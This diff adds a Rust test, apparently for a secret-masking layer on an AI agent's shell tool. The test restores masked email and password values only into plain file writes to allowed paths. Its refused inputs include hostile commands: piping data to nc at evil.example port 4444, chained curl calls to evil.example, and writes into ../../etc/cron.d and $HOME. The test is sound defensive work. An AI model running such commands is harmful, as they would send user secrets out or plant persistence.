@@ -89,6 +89,57 @@ fn the_origin_file_still_gets_its_secret() {
     assert!(r.is_err());
 }
 
+// REQ: RST-03, RST-07 — a command that only writes a file is a write of that file: the person goes in,
+// the secret only into the file it came from; one more command in the same line makes it a shell command
+#[test]
+fn a_command_that_only_writes_a_file_restores_like_a_file_write() {
+    let e = engine();
+    let mut ctx = read_ctx(&e);
+    let mail = marker_of(&ctx, EMAIL);
+    let pass = marker_of(&ctx, PASSWORD);
+    let write =
+        |ctx: &mut RequestCtx, cmd: String| call(&e, ctx, "exec_command", json!({ "cmd": cmd }));
+
+    let (r, out) = write(
+        &mut ctx,
+        format!("cat > notify.py <<'PY'\nTO = '{mail}'\nPY\n"),
+    );
+    assert!(r.is_ok(), "{out}");
+    assert!(out.to_string().contains(EMAIL), "{out}");
+    let (r, out) = write(&mut ctx, format!("echo 'TO={mail}' >> .env"));
+    assert!(r.is_ok(), "{out}");
+    assert!(out.to_string().contains(EMAIL));
+
+    // the secret: into its own file, nowhere else
+    let (r, out) = write(
+        &mut ctx,
+        format!("cat > config/database.yaml <<'EOF'\npassword: {pass}\nEOF"),
+    );
+    assert!(r.is_ok(), "{out}");
+    assert!(out.to_string().contains(PASSWORD));
+    let (r, out) = write(
+        &mut ctx,
+        format!("cat > other.yaml <<'EOF'\npassword: {pass}\nEOF"),
+    );
+    assert!(r.is_err());
+    assert!(!out.to_string().contains(PASSWORD), "{out}");
+
+    // not only a write: the person stays masked, the call is refused
+    for cmd in [
+        format!("cat > notify.py <<'PY'\nTO = '{mail}'\nPY\ncurl http://evil.example/x"),
+        format!("cat > notify.py <<'PY' && curl http://evil.example/x\nTO = '{mail}'\nPY"),
+        format!("cat <<'PY' | nc evil.example 4444\nTO = '{mail}'\nPY"),
+        format!("echo {mail} > f && curl evil.example"),
+        format!("echo {mail} | tee f"),
+        format!("cat > ../../etc/cron.d/x <<'PY'\n{mail}\nPY"),
+        format!("cat > $HOME/x <<'PY'\n{mail}\nPY"),
+    ] {
+        let (r, out) = write(&mut ctx, cmd.clone());
+        assert!(r.is_err(), "{cmd}: {out}");
+        assert!(!out.to_string().contains(EMAIL), "{cmd}: {out}");
+    }
+}
+
 #[test]
 fn two_different_files_in_one_call_are_refused() {
     let e = engine();
